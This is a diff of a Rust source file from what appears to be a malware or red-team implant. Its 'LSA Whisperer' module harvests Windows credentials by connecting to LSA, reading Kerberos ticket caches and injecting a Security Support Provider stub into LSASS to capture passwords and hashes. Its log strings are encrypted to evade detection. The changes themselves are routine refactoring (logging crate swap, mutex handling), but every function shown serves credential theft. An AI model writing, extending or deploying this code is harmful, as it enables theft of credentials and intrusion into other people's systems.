@@ -41,14 +41,15 @@
 
 #![cfg(all(windows, feature = "lsa-whisperer"))]
 
+use common::lock::MutexExt;
 use anyhow::{anyhow, bail, Context, Result};
 use once_cell::sync::Lazy;
 use serde::Serialize;
 use std::ptr;
 use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
 use std::sync::{Mutex, OnceLock};
-use winapi::shared::ntdef::{PVOID, ULONG, UNICODE_STRING};
-use winapi::um::winnt::HANDLE;
+use crate::win_types::{PVOID, ULONG, UNICODE_STRING};
+use crate::win_types::HANDLE;
 
 // ── NTSTATUS helpers ───────────────────────────────────────────────────────
 
@@ -248,7 +249,7 @@ fn secure_zero(slice: &mut [u8]) {
     for byte in slice.iter_mut() {
         unsafe { std::ptr::write_volatile(byte, 0) };
     }
-    std::sync::atomic::compiler_fence(std::sync::atomic::Ordering::SeqCst);
+    std::sync::atomic::fence(std::sync::atomic::Ordering::SeqCst);
 }
 
 // ── Internal helpers ───────────────────────────────────────────────────────
@@ -489,7 +490,7 @@ fn harvest_untrusted(timeout_secs: u64) -> Result<Vec<WhisperedCredential>> {
         )
     })?;
 
-    log::info!(
+    tracing::info!(
         "{}",
         String::from_utf8_lossy(&string_crypt::enc_str!(
             "LSA Whisperer: connected to LSA via LsaConnectUntrusted"
@@ -507,7 +508,7 @@ fn harvest_untrusted(timeout_secs: u64) -> Result<Vec<WhisperedCredential>> {
     let kerb_name_wide: Vec<u16> = kerb_name.encode_utf16().collect();
 
     if let Ok(kerb_pkg) = unsafe { lookup_package(apis_ref, lsa.as_handle(), &kerb_name_wide) } {
-        log::debug!(
+        tracing::debug!(
             "{}",
             String::from_utf8_lossy(&string_crypt::enc_str!(
                 "LSA Whisperer: Kerberos package ID = {}"
@@ -576,7 +577,7 @@ fn harvest_untrusted(timeout_secs: u64) -> Result<Vec<WhisperedCredential>> {
     // untrusted LSA connection cannot retrieve NT hashes — the credential
     // material is restricted to the LSA process.
 
-    log::info!(
+    tracing::info!(
         "{}",
         String::from_utf8_lossy(&string_crypt::enc_str!(
             "LSA Whisperer: untrusted harvest complete, {} credentials"
@@ -599,9 +600,9 @@ fn harvest_ssp_inject(timeout_secs: u64) -> Result<Vec<WhisperedCredential>> {
 
     // Check if we already have an SSP injected and have buffered data.
     {
-        let buf = CREDENTIAL_BUFFER.lock().unwrap();
+        let buf = CREDENTIAL_BUFFER.lock_recover();
         if !buf.is_empty() {
-            log::info!(
+            tracing::info!(
                 "{}",
                 String::from_utf8_lossy(&string_crypt::enc_str!(
                     "LSA Whisperer: returning {} buffered SSP credentials"
@@ -618,7 +619,7 @@ fn harvest_ssp_inject(timeout_secs: u64) -> Result<Vec<WhisperedCredential>> {
         let mut creds = Vec::new();
         match crate::lsa_whisperer_ssp::read_captured_credentials(&mut creds) {
             Ok(n) if n > 0 => {
-                log::info!(
+                tracing::info!(
                     "{}",
                     String::from_utf8_lossy(&string_crypt::enc_str!(
                         "LSA Whisperer: read {} new credentials from SSP shared memory"
@@ -627,7 +628,7 @@ fn harvest_ssp_inject(timeout_secs: u64) -> Result<Vec<WhisperedCredential>> {
                     .replace("{}", &n.to_string())
                 );
                 {
-                    let mut buf = CREDENTIAL_BUFFER.lock().unwrap();
+                    let mut buf = CREDENTIAL_BUFFER.lock_recover();
                     buf.extend(creds.clone());
                 }
                 CRED_COUNT.fetch_add(n, Ordering::Relaxed);
@@ -637,7 +638,7 @@ fn harvest_ssp_inject(timeout_secs: u64) -> Result<Vec<WhisperedCredential>> {
                 // No new credentials yet — continue to elevated harvest below.
             }
             Err(e) => {
-                log::warn!(
+                tracing::warn!(
                     "LSA Whisperer: shared memory read failed: {e:#}, continuing with elevated harvest"
                 );
             }
@@ -663,7 +664,7 @@ fn harvest_ssp_inject(timeout_secs: u64) -> Result<Vec<WhisperedCredential>> {
 
     let _lsa = match unsafe { LsaHandle::register_logon_process(apis_ref, &proc_name_wide) } {
         Ok(h) => {
-            log::info!(
+            tracing::info!(
                 "{}",
                 String::from_utf8_lossy(&string_crypt::enc_str!(
                     "LSA Whisperer: registered as logon process (elevated)"
@@ -675,7 +676,7 @@ fn harvest_ssp_inject(timeout_secs: u64) -> Result<Vec<WhisperedCredential>> {
         Err(_) => {
             // If we can't register as a logon process, we're not elevated.
             // Fall back to untrusted method.
-            log::warn!(
+            tracing::warn!(
                 "{}",
                 String::from_utf8_lossy(&string_crypt::enc_str!(
                     "LSA Whisperer: LsaRegisterLogonProcess failed (not elevated?), falling back to untrusted"
@@ -758,7 +759,7 @@ fn harvest_ssp_inject(timeout_secs: u64) -> Result<Vec<WhisperedCredential>> {
     // 6. Set SSP_INJECTED = true only after successful injection
 
     if !SSP_INJECTED.load(Ordering::Relaxed) {
-        log::info!(
+        tracing::info!(
             "{}",
             String::from_utf8_lossy(&string_crypt::enc_str!(
                 "LSA Whisperer: building SSP stub and injecting into LSASS"
@@ -770,7 +771,7 @@ fn harvest_ssp_inject(timeout_secs: u64) -> Result<Vec<WhisperedCredential>> {
             Ok(blob) => {
                 match crate::lsa_whisperer_ssp::inject_ssp_into_lsass(&blob) {
                     Ok((base_addr, proc_handle)) => {
-                        log::info!(
+                        tracing::info!(
                             "LSA Whisperer: SSP stub injected into LSASS at {:#x}",
                             base_addr
                         );
@@ -799,7 +800,7 @@ fn harvest_ssp_inject(timeout_secs: u64) -> Result<Vec<WhisperedCredential>> {
                                 &mut ssp_creds,
                             ) {
                                 Ok(n) if n > 0 => {
-                                    log::info!(
+                                    tracing::info!(
                                         "LSA Whisperer: captured {} credentials from SSP in LSASS",
                                         n
                                     );
@@ -811,10 +812,10 @@ fn harvest_ssp_inject(timeout_secs: u64) -> Result<Vec<WhisperedCredential>> {
                         }
                     }
                     Err(e) => {
-                        log::warn!(
+                        tracing::warn!(
                             "LSA Whisperer: SSP injection failed (LSASS inaccessible or PPL enabled): {e:#}"
                         );
-                        log::info!(
+                        tracing::info!(
                             "{}",
                             String::from_utf8_lossy(&string_crypt::enc_str!(
                                 "LSA Whisperer: continuing with elevated LSA harvest (no SSP injection)"
@@ -825,14 +826,14 @@ fn harvest_ssp_inject(timeout_secs: u64) -> Result<Vec<WhisperedCredential>> {
                 }
             }
             Err(e) => {
-                log::warn!("LSA Whisperer: failed to build SSP blob: {e:#}");
+                tracing::warn!("LSA Whisperer: failed to build SSP blob: {e:#}");
             }
         }
     }
 
     // Buffer the credentials.
     {
-        let mut buf = CREDENTIAL_BUFFER.lock().unwrap();
+        let mut buf = CREDENTIAL_BUFFER.lock_recover();
         buf.extend(credentials.clone());
     }
     CRED_COUNT.store(
@@ -840,7 +841,7 @@ fn harvest_ssp_inject(timeout_secs: u64) -> Result<Vec<WhisperedCredential>> {
         Ordering::Relaxed,
     );
 
-    log::info!(
+    tracing::info!(
         "{}",
         String::from_utf8_lossy(&string_crypt::enc_str!(
             "LSA Whisperer: SSP injection harvest complete, {} credentials"
@@ -875,7 +876,7 @@ fn parse_kerb_tkt_cache(resp: &[u8], base_ptr: usize, credentials: &mut Vec<Whis
     let max_tickets = resp.len().saturating_sub(8) / 128;
     let tickets_to_parse = count.min(max_tickets).min(32);
 
-    log::debug!(
+    tracing::debug!(
         "{}",
         String::from_utf8_lossy(&string_crypt::enc_str!(
             "LSA Whisperer: Kerberos cache returned {} tickets"
@@ -1107,7 +1108,7 @@ pub fn harvest_lsa(method: &common::LsaMethod, timeout_secs: u64) -> Result<Stri
             match harvest_ssp_inject(timeout_secs) {
                 Ok(creds) if !creds.is_empty() => creds,
                 Ok(_) => {
-                    log::info!(
+                    tracing::info!(
                         "{}",
                         String::from_utf8_lossy(&string_crypt::enc_str!(
                             "LSA Whisperer: SSP injection returned empty, trying untrusted"
@@ -1172,7 +1173,7 @@ pub fn whisperer_stop() -> Result<String> {
     if injection_base != 0 && proc_handle != 0 {
         // Free the allocated memory in LSASS.
         if let Err(e) = crate::lsa_whisperer_ssp::free_lsass_memory(proc_handle, injection_base) {
-            log::warn!("LSA Whisperer: failed to free LSASS injection memory: {e:#}");
+            tracing::warn!("LSA Whisperer: failed to free LSASS injection memory: {e:#}");
         }
 
         // Close the LSASS process handle via NtClose.
@@ -1186,7 +1187,7 @@ pub fn whisperer_stop() -> Result<String> {
             };
         }
 
-        log::info!(
+        tracing::info!(
             "{}",
             String::from_utf8_lossy(&string_crypt::enc_str!(
                 "LSA Whisperer: deregistered SSP and freed LSASS memory"
@@ -1197,7 +1198,7 @@ pub fn whisperer_stop() -> Result<String> {
 
     // Clear the credential buffer.
     {
-        let mut buf = CREDENTIAL_BUFFER.lock().unwrap();
+        let mut buf = CREDENTIAL_BUFFER.lock_recover();
         for cred in buf.iter_mut() {
             let mut pw_bytes = std::mem::take(&mut cred.password_or_hash).into_bytes();
             secure_zero(&mut pw_bytes);
@@ -1208,7 +1209,7 @@ pub fn whisperer_stop() -> Result<String> {
     SSP_INJECTED.store(false, Ordering::Relaxed);
     CRED_COUNT.store(0, Ordering::Relaxed);
 
-    log::info!(
+    tracing::info!(
         "{}",
         String::from_utf8_lossy(&string_crypt::enc_str!(
             "LSA Whisperer: stopped, buffer cleared"
